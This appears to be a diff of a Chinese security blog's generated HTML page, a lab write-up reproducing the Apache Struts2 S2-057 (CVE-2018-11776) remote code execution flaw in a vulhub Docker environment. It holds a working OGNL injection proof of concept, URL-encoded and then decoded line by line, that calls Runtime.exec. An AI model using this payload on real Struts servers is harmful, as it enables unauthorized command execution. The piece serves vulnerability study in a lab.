@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Struts2," />
 
 
 
@@ -89,16 +89,20 @@
 
 
 
-<meta name="description" content="徒然">
-<meta property="og:type" content="website">
-<meta property="og:title" content="smelond&#39;s Blog">
-<meta property="og:url" content="http://smelond.com/categories/web安全/index.html">
+<meta name="description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
+<meta name="keywords" content="Struts2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="s2-057复现">
+<meta property="og:url" content="http://smelond.com/2018/08/27/s2-057复现/index.html">
 <meta property="og:site_name" content="smelond&#39;s Blog">
-<meta property="og:description" content="徒然">
+<meta property="og:description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://smelond.com/image_upload/2018/08/20180827170729.png">
+<meta property="og:updated_time" content="2018-08-27T10:42:52.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="smelond&#39;s Blog">
-<meta name="twitter:description" content="徒然">
+<meta name="twitter:title" content="s2-057复现">
+<meta name="twitter:description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
+<meta name="twitter:image" content="http://smelond.com/image_upload/2018/08/20180827170729.png">
 
 
 
@@ -128,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://smelond.com/categories/web安全/"/>
+  <link rel="canonical" href="http://smelond.com/2018/08/27/s2-057复现/"/>
 
 
 
 
 
-  <title>分类: web安全 | smelond's Blog</title>
+  <title>s2-057复现 | smelond's Blog</title>
   
 
 
@@ -163,7 +167,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -301,167 +305,260 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block category">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>web安全<small>分类</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/08/27/s2-057复现/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="smelond">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smelond's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/04/20/网站提权之MSF骚操作/" itemprop="url">
-              
-                <span itemprop="name">网站提权之MSF骚操作</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">s2-057复现</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-20T17:37:08+08:00"
-              content="2018-04-20" >
-          04-20
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-27T18:07:03+08:00">
+                2018-08-27
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Struts2/" itemprop="url" rel="index">
+                    <span itemprop="name">Struts2</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/27/s2-057复现/" class="leancloud_visitors" data-flag-title="s2-057复现">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  <blockquote class="blockquote-center">恩 我还在等一个人 等一个让九月的风变暖的人</blockquote>这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/11/PHP大马后门分析/" itemprop="url">
-              
-                <span itemprop="name">PHP大马后门分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-11T08:39:00+08:00"
-              content="2018-04-11" >
-          04-11
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/04/sql注入之盲注攻击/" itemprop="url">
-              
-                <span itemprop="name">sql注入之盲注攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-04T09:30:13+08:00"
-              content="2018-04-04" >
-          04-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/02/sql注入之注入类型/" itemprop="url">
-              
-                <span itemprop="name">sql注入之注入类型</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-02T08:51:30+08:00"
-              content="2018-04-02" >
-          04-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/03/28/sql注入之入门/" itemprop="url">
-              
-                <span itemprop="name">sql注入之入门</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-28T20:59:33+08:00"
-              content="2018-03-28" >
-          03-28
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <p>影响版本<br>Struts 2.3 - 2.3.34<br>Struts 2.5 - 2.5.16</p>
+<p>修复版本<br>Struts 2.3.35<br>Struts 2.5.17</p>
+<h3 id="搭建环境docker"><a href="#搭建环境docker" class="headerlink" title="搭建环境docker"></a>搭建环境docker</h3><p>安装docker可以去看官方文档：<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/#supported-storage-drivers" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/#supported-storage-drivers</a></p>
+<p>克隆vulhub并启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-048</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>如果执行出错：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Couldn<span class="string">'t connect to Docker daemon at http+docker://localhost - is it running?</span></span><br><span class="line"><span class="string">If it'</span>s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br></pre></td></tr></table></figure></p>
+<p>执行下面的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo su </span><br><span class="line">su anjing</span><br></pre></td></tr></table></figure></p>
+<p>然后重新执行：docker-compose up -d </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">anjing@anjing-virtual:~/vulhub/struts2/s2-048$ docker ps </span><br><span class="line">CONTAINER ID        IMAGE                            COMMAND             CREATED              STATUS              PORTS                    NAMES</span><br><span class="line">dfabd36b7350        vulhub/struts2:2.3.32-showcase   <span class="string">"catalina.sh run"</span>   About a minute ago   Up About a minute   0.0.0.0:8080-&gt;8080/tcp   s2-048_struts2_1</span><br></pre></td></tr></table></figure>
+<h3 id="搭建st2-057漏洞环境"><a href="#搭建st2-057漏洞环境" class="headerlink" title="搭建st2-057漏洞环境"></a>搭建st2-057漏洞环境</h3><p>进入docker<br>填写上面的CONTAINER ID<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t dfabd36b7350 /bin/bash</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y</span><br><span class="line">apt-get install vim -y</span><br><span class="line">mkdir /usr/<span class="built_in">local</span>/tomcat/webapps/<span class="built_in">test</span></span><br><span class="line">wget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zip</span><br><span class="line">apt-get install unzip -y</span><br><span class="line">unzip struts-2.5.16-all.zip</span><br><span class="line">cp struts-2.5.16/apps/struts2-showcase.war  /usr/<span class="built_in">local</span>/tomcat/webapps/</span><br></pre></td></tr></table></figure>
+<p>修改配置文件<br>需要修改下面两个配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml.bak</span><br><span class="line">cp /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml.bak</span><br><span class="line">vim /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml</span><br><span class="line">vim /usr/<span class="built_in">local</span>/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml</span><br><span class="line">``` </span><br><span class="line">修改为下面这个</span><br><span class="line">``` html</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name=<span class="string">"actionchaining"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">        &lt;action name=<span class="string">"actionChain1"</span> class=<span class="string">"org.apache.struts2.showcase.actionchaining.ActionChain1"</span>&gt;</span><br><span class="line">           &lt;result <span class="built_in">type</span>=<span class="string">"redirectAction"</span>&gt;</span><br><span class="line">             &lt;param name = <span class="string">"actionName"</span>&gt;register2&lt;/param&gt;</span><br><span class="line">           &lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大概就是这样<br><img src="/image_upload/2018/08/20180827170729.png" alt="Alt text"></p>
+<p>重启服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/tomcat/bin/</span><br><span class="line">./shutdown.sh 	//现在应该已经退出了docker，回到了本机shell</span><br></pre></td></tr></table></figure></p>
+<p>重新输入：docker-compose up -d<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anjing@anjing-virtual:~/vulhub/struts2/s2-048$ docker-compose up -d</span><br><span class="line">Starting s2-048_struts2_1 ... <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="验证st2-057"><a href="#验证st2-057" class="headerlink" title="验证st2-057"></a>验证st2-057</h3><p>执行命令：<a href="http://127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-showcase/${(111+111)}/actionChain1.action</a><br>${(111+111)}  ==  222<br>返回的url为：<a href="http://127.0.0.1:8080/struts2-showcase/222/register2.action" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-showcase/222/register2.action</a></p>
+<p>但是我这里执行calc并没有弹出来，不知道哪位大佬是否怎么回事</p>
+<p>弹计算器poc（感谢jas502n大佬提供）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/struts2-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%27calc%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23jas502n%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23jas502n.println(%23d+)%2c%23jas502n.close())%7d/actionChain1.action</span><br></pre></td></tr></table></figure></p>
+<p>poc-example:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new  java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),#jas502n.println(#d ),#jas502n.close())&#125;</span><br></pre></td></tr></table></figure></p>
+<p>拆分<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(</span><br><span class="line">#_memberAccess["allowStaticMethodAccess"]=true,</span><br><span class="line">#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),</span><br><span class="line">#b=new java.io.InputStreamReader(#a),</span><br><span class="line">#c=new java.io.BufferedReader(#b),</span><br><span class="line">#d=new char[51020],</span><br><span class="line">#c.read(#d),</span><br><span class="line">#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),</span><br><span class="line">#jas502n.println(#d),</span><br><span class="line">#jas502n.close())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>参考：<br><a href="https://github.com/jas502n/St2-057" target="_blank" rel="noopener">https://github.com/jas502n/St2-057</a><br><a href="https://www.anquanke.com/post/id/157518" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157518</a><br><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></p>
 
       
     </div>
+    
+    
+    
 
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/08/27/s2-057复现/">s2-057复现</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 smelond 的个人博客">smelond</a></p>
+  <p><span>发布时间:</span>2018年08月27日 - 18:08</p>
+  <p><span>最后更新:</span>2018年08月27日 - 18:08</p>
+  <p><span>原始链接:</span><a href="/2018/08/27/s2-057复现/" title="s2-057复现">http://smelond.com/2018/08/27/s2-057复现/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/08/27/s2-057复现/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+	</div>
+	
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Struts2/" <i class="fa fa-tag"></i> Struts2</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/09/hexo从github移动到centos个人服务器/" rel="next" title="hexo从github移动到centos个人服务器">
+                <i class="fa fa-chevron-left"></i> hexo从github移动到centos个人服务器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+      <!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-tencentweibo"><p>腾讯微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+		<li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-renren"><p>人人网</p></li>
+        <li class="-mob-share-kaixin"><p>开心网</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=2501104178e4c"></script>
+<!--MOB SHARE END-->
+      
+    </div>
+  </div>
 
 
           </div>
@@ -469,6 +566,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNTEzOC8xMTY3Mw=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -489,8 +595,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -593,6 +708,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#搭建环境docker"><span class="nav-number">1.</span> <span class="nav-text">搭建环境docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#搭建st2-057漏洞环境"><span class="nav-number">2.</span> <span class="nav-text">搭建st2-057漏洞环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证st2-057"><span class="nav-number">3.</span> <span class="nav-text">验证st2-057</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -744,6 +875,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -772,6 +907,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
